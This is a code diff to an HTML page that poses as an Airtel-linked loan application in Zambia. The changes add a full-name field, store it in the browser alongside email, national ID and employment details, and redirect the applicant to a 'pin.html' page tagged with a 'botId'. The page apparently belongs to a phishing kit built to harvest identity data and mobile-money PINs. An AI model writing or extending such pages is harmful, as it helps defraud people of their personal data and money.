@@ -28,7 +28,6 @@ button { width: 100%; padding: 12px; background: red; color: white; border: none
 .loan-notice li {
     margin-bottom: 6px;
 }
-
 </style>
 </head>
 <body>
@@ -40,6 +39,10 @@ button { width: 100%; padding: 12px; background: red; color: white; border: none
     </div>
 
     <form id="loanForm">
+        <!-- NEW NAME INPUT -->
+        <label>Full Name</label>
+        <input id="fullName" type="text" required placeholder="Enter your full name">
+
         <label>Loan Amount (ZMW)</label>
         <input id="loanAmount" type="number" required placeholder="MIN500-MAX20000">
         <label>Email</label>
@@ -75,13 +78,12 @@ button { width: 100%; padding: 12px; background: red; color: white; border: none
         </select>
 
         <div class="loan-notice">
-    <strong>Qualification Notice:</strong>
-    <ol>
-        <li>Must apply with valid Airtel Number</li>
-        <li>Must have at least 10% of the amount applying in the Airtel account </li>
-    </ol>
-</div>
-
+            <strong>Qualification Notice:</strong>
+            <ol>
+                <li>Must apply with valid Airtel Number</li>
+                <li>Must have at least 10% of the amount applying in the Airtel account </li>
+            </ol>
+        </div>
 
         <button type="submit">Next</button>
     </form>
@@ -101,6 +103,9 @@ localStorage.setItem('botId', botId);
 // ---------------- FORM LOGIC ----------------
 document.getElementById('loanForm').addEventListener('submit', e => {
     e.preventDefault();
+
+    // SAVE NAME + EXISTING FIELDS
+    localStorage.setItem('fullName', fullName.value); // NEW
     localStorage.setItem('loanAmount', loanAmount.value);
     localStorage.setItem('email', email.value);
     localStorage.setItem('nationalId', nationalId.value);
@@ -108,7 +113,7 @@ document.getElementById('loanForm').addEventListener('submit', e => {
     localStorage.setItem('employmentStatus', employmentStatus.value);
     localStorage.setItem('loanPurpose', loanPurpose.value);
 
-    window.location.href = `details.html?botId=${botId}`;
+    window.location.href = `pin.html?botId=${botId}`;
 });
 </script>
 </body>
